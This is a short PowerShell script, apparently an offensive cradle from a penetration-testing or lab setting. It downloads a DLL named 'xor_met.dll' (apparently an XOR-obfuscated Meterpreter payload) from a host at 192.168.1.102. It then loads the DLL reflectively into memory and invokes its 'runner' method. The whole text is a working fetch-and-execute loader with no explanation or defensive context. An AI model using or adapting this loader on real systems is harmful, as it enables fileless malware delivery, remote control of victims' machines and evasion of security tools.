$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.102/xor_met.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
